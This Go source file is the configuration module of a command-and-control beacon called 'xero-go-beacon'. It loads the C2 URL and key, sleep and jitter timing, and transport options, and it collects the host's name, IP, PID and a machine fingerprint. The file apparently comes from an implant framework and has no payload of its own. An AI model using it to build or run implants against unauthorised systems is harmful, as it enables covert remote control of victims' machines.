package config

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
)

var (
	CompiledC2URL                 = ""
	CompiledC2PublicKeyB64        = ""
	CompiledProfileName           = "default"
	CompiledSleepSeconds          = "30"
	CompiledJitter                = "0.1"
	CompiledTransport             = "auto"
	CompiledFallbackLongPoll      = "true"
	CompiledOutputLimitBytes      = "65536"
	CompiledStatePath             = ""
	CompiledUserAgent             = "xero-go-beacon/0.1"
	CompiledColdStartRestFallback = "false"
)

type Config struct {
	C2URL                   string  `json:"c2_url"`
	C2PublicKeyB64          string  `json:"c2_public_key_b64"`
	ProfileName             string  `json:"profile_name"`
	SleepSeconds            int     `json:"sleep_seconds"`
	Jitter                  float64 `json:"jitter"`
	Transport               string  `json:"transport"`
	FallbackLongPollEnabled bool    `json:"fallback_longpoll_enabled"`
	ColdStartRestFallback   bool    `json:"cold_start_rest_fallback"`
	StatePath               string  `json:"state_path"`
	UserAgent               string  `json:"user_agent"`
	OutputLimitBytes        int     `json:"output_limit_bytes"`
	MachineFingerprintHash  string  `json:"machine_fingerprint_hash"`
	Hostname                string  `json:"hostname"`
	OS                      string  `json:"os"`
	Architecture            string  `json:"architecture"`
	InternalIP              string  `json:"internal_ip"`
	ExternalIP              string  `json:"external_ip,omitempty"`
	PID                     int     `json:"pid"`
	Once                    bool    `json:"-"`
	ConfigPath              string  `json:"-"`
}

type fileConfig struct {
	C2URL                   *string  `json:"c2_url"`
	C2PublicKeyB64          *string  `json:"c2_public_key_b64"`
	ProfileName             *string  `json:"profile_name"`
	SleepSeconds            *int     `json:"sleep_seconds"`
	Jitter                  *float64 `json:"jitter"`
	Transport               *string  `json:"transport"`
	FallbackLongPollEnabled *bool    `json:"fallback_longpoll_enabled"`
	ColdStartRestFallback   *bool    `json:"cold_start_rest_fallback"`
	StatePath               *string  `json:"state_path"`
	UserAgent               *string  `json:"user_agent"`
	OutputLimitBytes        *int     `json:"output_limit_bytes"`
	MachineFingerprintHash  *string  `json:"machine_fingerprint_hash"`
	ExternalIP              *string  `json:"external_ip"`
}

func Load(args []string) (Config, error) {
	flags := flag.NewFlagSet("xero-beacon", flag.ContinueOnError)
	configPath := flags.String("config", os.Getenv("XERO_BEACON_CONFIG"), "path to JSON config")
	once := flags.Bool("once", false, "run one transport cycle and exit")
	transportOverride := flags.String("transport", "", "transport override: auto, websocket, or long-poll")
	if err := flags.Parse(args); err != nil {
		return Config{}, err
	}

	cfg := compiledDefaults()
	cfg.ConfigPath = *configPath
	cfg.Once = *once
	if *configPath != "" {
		if err := applyConfigFile(&cfg, *configPath); err != nil {
			return Config{}, err
		}
	}
	applyEnv(&cfg)
	if *transportOverride != "" {
		cfg.Transport = *transportOverride
	}
	applyRuntimeMetadata(&cfg)
	return cfg, validate(cfg)
}

func compiledDefaults() Config {
	return Config{
		C2URL:                   CompiledC2URL,
		C2PublicKeyB64:          CompiledC2PublicKeyB64,
		ProfileName:             defaultString(CompiledProfileName, "default"),
		SleepSeconds:            intDefault(CompiledSleepSeconds, 30),
		Jitter:                  floatDefault(CompiledJitter, 0.1),
		Transport:               defaultString(CompiledTransport, "auto"),
		FallbackLongPollEnabled: boolDefault(CompiledFallbackLongPoll, true),
		ColdStartRestFallback:   boolDefault(CompiledColdStartRestFallback, false),
		StatePath:               CompiledStatePath,
		UserAgent:               defaultString(CompiledUserAgent, "xero-go-beacon/0.1"),
		OutputLimitBytes:        intDefault(CompiledOutputLimitBytes, 65536),
		OS:                      runtime.GOOS,
		Architecture:            runtime.GOARCH,
		PID:                     os.Getpid(),
	}
}

func applyConfigFile(cfg *Config, path string) error {
	content, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	var file fileConfig
	if err := json.Unmarshal(content, &file); err != nil {
		return err
	}
	if file.C2URL != nil {
		cfg.C2URL = *file.C2URL
	}
	if file.C2PublicKeyB64 != nil {
		cfg.C2PublicKeyB64 = *file.C2PublicKeyB64
	}
	if file.ProfileName != nil {
		cfg.ProfileName = *file.ProfileName
	}
	if file.SleepSeconds != nil {
		cfg.SleepSeconds = *file.SleepSeconds
	}
	if file.Jitter != nil {
		cfg.Jitter = *file.Jitter
	}
	if file.Transport != nil {
		cfg.Transport = *file.Transport
	}
	if file.FallbackLongPollEnabled != nil {
		cfg.FallbackLongPollEnabled = *file.FallbackLongPollEnabled
	}
	if file.ColdStartRestFallback != nil {
		cfg.ColdStartRestFallback = *file.ColdStartRestFallback
	}
	if file.StatePath != nil {
		cfg.StatePath = *file.StatePath
	}
	if file.UserAgent != nil {
		cfg.UserAgent = *file.UserAgent
	}
	if file.OutputLimitBytes != nil {
		cfg.OutputLimitBytes = *file.OutputLimitBytes
	}
	if file.MachineFingerprintHash != nil {
		cfg.MachineFingerprintHash = *file.MachineFingerprintHash
	}
	if file.ExternalIP != nil {
		cfg.ExternalIP = *file.ExternalIP
	}
	return nil
}

func applyEnv(cfg *Config) {
	stringEnv(&cfg.C2URL, "XERO_BEACON_C2_URL")
	stringEnv(&cfg.C2PublicKeyB64, "XERO_BEACON_C2_PUBLIC_KEY_B64")
	stringEnv(&cfg.ProfileName, "XERO_BEACON_PROFILE_NAME")
	stringEnv(&cfg.Transport, "XERO_BEACON_TRANSPORT")
	stringEnv(&cfg.StatePath, "XERO_BEACON_STATE_PATH")
	stringEnv(&cfg.UserAgent, "XERO_BEACON_USER_AGENT")
	stringEnv(&cfg.MachineFingerprintHash, "XERO_BEACON_MACHINE_FINGERPRINT_HASH")
	stringEnv(&cfg.ExternalIP, "XERO_BEACON_EXTERNAL_IP")
	intEnv(&cfg.SleepSeconds, "XERO_BEACON_SLEEP_SECONDS")
	intEnv(&cfg.OutputLimitBytes, "XERO_BEACON_OUTPUT_LIMIT_BYTES")
	floatEnv(&cfg.Jitter, "XERO_BEACON_JITTER")
	boolEnv(&cfg.FallbackLongPollEnabled, "XERO_BEACON_FALLBACK_LONGPOLL_ENABLED")
	boolEnv(&cfg.ColdStartRestFallback, "XERO_BEACON_COLD_START_REST_FALLBACK")
}

func applyRuntimeMetadata(cfg *Config) {
	hostname, err := os.Hostname()
	if err == nil && cfg.Hostname == "" {
		cfg.Hostname = hostname
	}
	if cfg.InternalIP == "" {
		cfg.InternalIP = firstPrivateIP()
	}
	if cfg.MachineFingerprintHash == "" {
		cfg.MachineFingerprintHash = strings.ToLower(fmt.Sprintf("%s-%s-%s", cfg.Hostname, cfg.OS, cfg.Architecture))
	}
	if cfg.StatePath == "" {
		cfg.StatePath = defaultStatePath()
	}
}

func validate(cfg Config) error {
	if cfg.C2URL == "" {
		return fmt.Errorf("c2_url is required")
	}
	if cfg.C2PublicKeyB64 == "" {
		return fmt.Errorf("c2_public_key_b64 is required")
	}
	if cfg.SleepSeconds < 1 {
		return fmt.Errorf("sleep_seconds must be positive")
	}
	if cfg.Jitter < 0 || cfg.Jitter > 1 {
		return fmt.Errorf("jitter must be between 0 and 1")
	}
	switch cfg.Transport {
	case "auto", "websocket", "long-poll":
	default:
		return fmt.Errorf("transport must be auto, websocket, or long-poll")
	}
	if cfg.OutputLimitBytes < 1024 {
		return fmt.Errorf("output_limit_bytes must be at least 1024")
	}
	return nil
}

func firstPrivateIP() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1"
	}
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ip, _, err := net.ParseCIDR(addr.String())
			if err == nil && ip.To4() != nil {
				return ip.String()
			}
		}
	}
	return "127.0.0.1"
}

func defaultStatePath() string {
	if value := os.Getenv("XDG_STATE_HOME"); value != "" {
		return value + string(os.PathSeparator) + "xero" + string(os.PathSeparator) + "beacon-state.json"
	}
	if home, err := os.UserHomeDir(); err == nil {
		return home + string(os.PathSeparator) + ".xero" + string(os.PathSeparator) + "beacon-state.json"
	}
	return "beacon-state.json"
}

func stringEnv(target *string, key string) {
	if value, ok := os.LookupEnv(key); ok {
		*target = strings.TrimSpace(value)
	}
}

func intEnv(target *int, key string) {
	if value, ok := os.LookupEnv(key); ok {
		if parsed, err := strconv.Atoi(value); err == nil {
			*target = parsed
		}
	}
}

func floatEnv(target *float64, key string) {
	if value, ok := os.LookupEnv(key); ok {
		if parsed, err := strconv.ParseFloat(value, 64); err == nil {
			*target = parsed
		}
	}
}

func boolEnv(target *bool, key string) {
	if value, ok := os.LookupEnv(key); ok {
		if parsed, err := strconv.ParseBool(value); err == nil {
			*target = parsed
		}
	}
}

func defaultString(value string, fallback string) string {
	if strings.TrimSpace(value) == "" {
		return fallback
	}
	return strings.TrimSpace(value)
}

func intDefault(value string, fallback int) int {
	if parsed, err := strconv.Atoi(value); err == nil {
		return parsed
	}
	return fallback
}

func floatDefault(value string, fallback float64) float64 {
	if parsed, err := strconv.ParseFloat(value, 64); err == nil {
		return parsed
	}
	return fallback
}

func boolDefault(value string, fallback bool) bool {
	if parsed, err := strconv.ParseBool(value); err == nil {
		return parsed
	}
	return fallback
}
